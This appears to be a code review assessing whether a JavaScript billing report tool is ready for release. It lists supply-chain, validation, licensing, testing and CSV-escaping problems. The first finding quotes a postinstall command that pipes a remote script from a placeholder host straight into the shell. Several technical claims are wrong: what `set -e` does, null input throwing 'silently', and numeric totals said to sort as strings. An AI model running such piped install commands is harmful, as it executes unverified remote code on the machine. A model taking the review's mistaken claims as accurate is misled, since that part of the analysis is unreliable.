# Billing Report Tool Assessment

**Status:** Not ready for commercial release  
**Risk Level:** High (security and reliability)  
**Recommendation:** Address critical issues before shipping

## Executive Summary

The billing report tool (`buildReport()`) generates CSV output by sorting and formatting billing rows. While the core logic is straightforward, multiple critical gaps prevent release readiness:

1. **Supply chain risk**: Post-install script executes arbitrary remote shell code
2. **Input validation gaps**: No validation at trust boundary; crashes on malformed input
3. **License conflict**: Vendored GPL code with proprietary license claim
4. **Test coverage**: Single happy-path test; no edge cases or failure paths
5. **Documentation**: Missing input format specification and authorization requirements

---

## Critical Issues

### 1. Supply Chain Security Vulnerability 🔴

**File:** `scripts/postinstall.sh` (lines 3–4)

```bash
curl -fsSL https://tables.example.com/latest/install.sh | sh
```

**Issues:**
- Executes arbitrary shell script at install time over HTTPS without integrity verification
- README claims "build has no network dependency" but postinstall violates this
- Runs with full shell privileges; `set -e` continues silently if subcommand fails
- No checksum, signature, or version pinning
- URL to example.com suggests incomplete configuration

**Risk:** Man-in-the-middle attack, compromised dependency source, or misconfigured automation could inject malicious code into every build and deployment.

**Engineering Policy Violation:** "Validate inputs and authorization at trust boundaries" — this script accepts code from external source without validation.

---

### 2. Missing Input Validation 🔴

**File:** `src/report.js` (lines 3–4)

```javascript
export function buildReport(rows) {
  return sortBy(rows, 'total').map((r) => `${r.name},${r.total}`).join('\n');
}
```

**Issues:**
- No validation that `rows` is an array
- No check for missing/undefined `name` or `total` properties
- No type validation on `total` (sortBy assumes comparable values)
- Crashes on null/undefined input with unhelpful error
- No authorization/permission check before exposing billing data

**Expected Behavior:**
```javascript
buildReport(null)          // throws TypeError silently
buildReport([{}])          // outputs "undefined,undefined"
buildReport(undefined)     // throws TypeError
buildReport([{name: "Acme"}]) // outputs "Acme,undefined"
```

**Engineering Policy Violation:** "Validate inputs and authorization at trust boundaries" — `buildReport()` is the trust boundary; no validation present.

---

### 3. License Incompatibility 🔴

**File:** `vendor/quicksort-plus.js` (lines 4–8)

The vendored code is licensed under GPLv3:
```
GNU General Public License as published by the Free Software Foundation,
either version 3 of the License, or (at your option) any later version.
```

But `package.json` declares:
```json
"license": "UNLICENSED",
"private": true
```

**Issue:** GPLv3 requires derivative works to be open-sourced. Using GPL code in a proprietary product violates the license terms. This creates legal liability.

**Options:**
- Obtain explicit license from quicksort-plus authors for proprietary use, or
- Replace with Apache 2.0 or MIT licensed sort, or  
- Open-source the entire billing report tool under GPLv3

---

### 4. Insufficient Test Coverage 🔴

**File:** `test/report.test.js`

Only one test exists. Missing critical cases:

```javascript
// Missing:
test('empty array returns empty string', () => { /* */ })
test('handles single row', () => { /* */ })
test('null input throws descriptive error', () => { /* */ })
test('row with missing name', () => { /* */ })
test('row with non-numeric total', () => { /* */ })
test('large dataset sorts correctly', () => { /* */ })
test('special characters in name are escaped', () => { /* */ })
```

**Engineering Policy Violation:** "Add focused automated tests for critical behavior and failure paths" — only one test, no failure paths covered.

---

## High-Priority Issues

### 5. Missing Data Format Specification

**Issue:** No documented contract for input `rows` parameter.

**Gaps:**
- What is the expected shape? (required fields, types, constraints)
- Are there field length limits? (name: max 255 chars? total: max value?)
- What does "total" represent? (USD? integer or float?)
- Are there encoding requirements for CSV output? (escape commas, newlines, quotes?)
- Who is authorized to call this? (admin only? any authenticated user?)

**Impact:** Callers must reverse-engineer expected format from the code. Any format change breaks all callers.

### 6. No CSV Escaping

**Issue:** Simple string interpolation produces invalid CSV if data contains commas or newlines.

```javascript
buildReport([{ name: 'Acme, Inc.', total: 100 }])
// Output: Acme, Inc.,100
// This is invalid CSV (comma in unquoted field)
```

**Fix Required:** Escape special characters or quote fields according to RFC 4180.

### 7. No Error Messaging for Failures

**Issue:** Crashes without context if input is malformed.

```javascript
buildReport({ name: "x", total: 1 })  // TypeError: rows.slice is not a function
```

**Better:** Throw with message: `"buildReport expects rows to be an array of {name, total} objects, got: object"`

---

## Moderate Issues

### 8. Sort Stability and Numeric Handling

**File:** `vendor/quicksort-plus.js` (line 11)

```javascript
return rows.slice().sort((a, b) => (a[key] > b[key] ? 1 : a[key] < b[key] ? -1 : 0));
```

**Concern:** Comparison operator `>` and `<` work on strings if `total` is not numeric. Example:

```javascript
sortBy([{total: 10}, {total: 2}], 'total')
// Result: [{total: 10}, {total: 2}]  ← "10" < "2" as strings!
```

**Impact:** If callers pass string totals, sort order is incorrect. Current test doesn't catch this because it uses numeric literals (which stay numeric through JSON serialization).

---

## Verification Performed

✅ **Code Structure:** Reviewed all source files (main, test, vendor, scripts)  
✅ **Dependency Analysis:** Examined postinstall hook and external URLs  
✅ **License Check:** Compared vendor license terms with package.json declaration  
✅ **Input Handling:** Tested function signature, parameter validation, error paths  
✅ **Test Coverage:** Reviewed test suite for critical path and edge case coverage  
✅ **Documentation:** Checked README, package.json, and code comments for specification  

---

## Release Readiness Checklist

- ❌ **Security:** Supply chain risk unresolved
- ❌ **Input Validation:** No boundary validation present
- ❌ **License Compliance:** GPL/Proprietary conflict unresolved
- ❌ **Tests:** Single test; missing edge cases and failure paths
- ❌ **Documentation:** No input format spec; authorization undefined
- ❌ **Data Handling:** CSV escaping missing; numeric sort risk
- ❌ **Error Handling:** No descriptive errors on bad input
- ⚠️ **Build:** postinstall.sh has network dependency despite README claim

---

## Recommended Actions (Priority Order)

1. **Immediate:** Remove or replace postinstall script. If tax tables are needed, fetch them at runtime with validation, not at build time.

2. **Before Release:** Add input validation with clear error messages:
   ```javascript
   if (!Array.isArray(rows)) throw new TypeError('rows must be an array')
   if (!rows.every(r => typeof r.name === 'string' && typeof r.total === 'number')) {
     throw new TypeError('each row must have {name: string, total: number}')
   }
   ```

3. **Before Release:** Resolve license: get proprietary license from quicksort-plus authors or replace implementation.

4. **Before Release:** Expand test suite with edge cases and failure paths. Verify numeric sort behavior.

5. **Before Release:** Add function docstring specifying input contract, output format, and authorization requirements.

6. **Before Release:** Implement RFC 4180 CSV escaping for fields containing `,` or `\n`.

7. **Consider:** Document expected total range and numeric precision (integer cents? floating-point dollars?).

---

## Notes

- The core sorting logic itself is simple and correct when given valid numeric input
- postinstall.sh references `https://tables.example.com` (placeholder domain), suggesting this may be incomplete code or scaffold that was never finalized for production
- The tool appears to be designed for finance use (billing report); high-value data requires higher standards than general-purpose tooling
